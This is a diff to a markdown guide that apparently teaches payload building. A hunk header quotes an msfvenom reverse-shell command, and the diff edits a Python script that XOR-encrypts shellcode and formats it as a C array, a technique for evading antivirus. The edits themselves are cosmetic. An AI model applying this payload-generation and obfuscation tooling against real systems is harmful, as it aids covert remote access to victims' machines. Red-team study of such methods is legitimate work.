@@ -587,7 +587,7 @@ msfvenom -p windows/x64/shell_reverse_tcp \
 ```
 
 **Step 2: Python XOR Encryptor — `xor_encrypt.py`**
-
+{% raw %}
 ```python
 #!/usr/bin/env python3
 """
@@ -608,19 +608,8 @@ def xor_encrypt(data: bytes, key: bytes) -> bytes:
 
 def format_c_array(data: bytes, var_name: str = "shellcode") -> str:
     """Format bytes as a C unsigned char array."""
-    lines = []
-    lines.append(f"unsigned char {var_name}[] = ")
     hex_bytes = [f"0x{b:02x}" for b in data]
 
-    # Format in rows of 16 bytes
-    for i in range(0, len(hex_bytes), 16):
-        row = ", ".join(hex_bytes[i:i+16])
-        if i == 0:
-            lines.append(f'    "{row}"')
-        else:
-            lines.append(f'    "{row}"')
-
-    # Actually, use a simpler format
     lines = [f"unsigned char {var_name}[] = {{"]
     for i in range(0, len(hex_bytes), 12):
         chunk = ", ".join(hex_bytes[i:i+12])
@@ -664,8 +653,10 @@ def main():
     output_file = payload_file + ".xor"
     with open(output_file, "wb") as f:
         f.write(encrypted)
+
     print(f"\n[+] Encrypted payload saved to: {output_file}")
     print(f"[+] Key saved to: {output_file}.key")
+
     with open(output_file + ".key", "wb") as f:
         f.write(key)
 
